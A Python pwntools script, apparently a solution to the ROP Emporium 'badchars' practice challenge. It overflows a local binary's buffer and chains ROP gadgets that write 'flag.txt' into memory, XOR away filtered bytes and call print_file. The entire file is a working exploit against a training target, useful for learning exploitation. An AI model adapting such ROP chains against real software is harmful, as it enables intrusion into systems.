from pwn import *

p = process("./badchars")
p.recvuntil(b"> ")

ascii_dict = {'a':0x61, 'x':0x78, 'g':0x67, '.':0x2e}

def get_xored_byte(badchar):
    return ascii_dict[badchar] ^ 0xeb

elf = ELF("./badchars", checksec=False)

what = b"flag.txt" # 8 bytes.. 
where = 0x00601038 # bss section, (see below why not data section)

print_file = elf.plt["print_file"]
pwnme_ret_address = 0x400610

xor = 0x400628 # xor %r14b, (%r15); ret
add = 0x40062c # add %r14b,(%r15); ret
sub = 0x400630 # sub %r14b,(%r15); ret
mov = 0x400634 # mov %r12,0x0(%r13); ret
pop_all = 0x000000000040069c #: pop r12; pop r13; pop r14; pop r15; ret; 
pop_rdi = 0x00000000004006a3 #: pop rdi; ret;
pop_r14_r15 = 0x00000000004006a0# : pop r14; pop r15; ret; 
ret = 0x00000000004004ee # ret;

xor_addr1 = where + 2
xor_addr2 = where + 3
xor_addr3 = where + 4
xor_addr4 = where + 6

# string is transformed in 0x74eb74ebebeb6c66 (after first write)

# badchars are: 'x', 'g', 'a', '.'
# f  l  a  g  .  t  x  t
# 66 6c 61 67 2e 74 78 74
# 66 6c eb eb eb 74 eb 74

# so each bad chars is transformed into 0xeb
# so if we xor those characters with the xor of badchar XOR eb, we obtain the right string!
# addresses of badchars are +2 +3 +4 +6 w.r.t where
# the problem is that the address where + 6 contains a bad char if you use
# the data section !!!
# just use the bss section, which is still writable and has 8 juicy bytes for us

offset = 0x20 + 8

payload = b"A"*offset

payload += p64(pop_all)
payload += what
payload += p64(where)
payload += p64(0)
payload += p64(1)
payload += p64(mov) 

payload += p64(pop_r14_r15)
payload += p64(get_xored_byte('a'))
payload += p64(xor_addr1)
payload += p64(xor)

payload += p64(pop_r14_r15)
payload += p64(get_xored_byte('g'))
payload += p64(xor_addr2)
payload += p64(xor)

payload += p64(pop_r14_r15)
payload += p64(get_xored_byte('.'))
payload += p64(xor_addr3)
payload += p64(xor)

payload += p64(pop_r14_r15)
payload += p64(get_xored_byte('x'))
payload += p64(xor_addr4)
payload += p64(xor)

payload += p64(pop_rdi)
payload += p64(where)
payload += p64(print_file)
payload += p64(pwnme_ret_address)

p.send(payload)

print(p.recvline().decode() + p.recvline().decode())
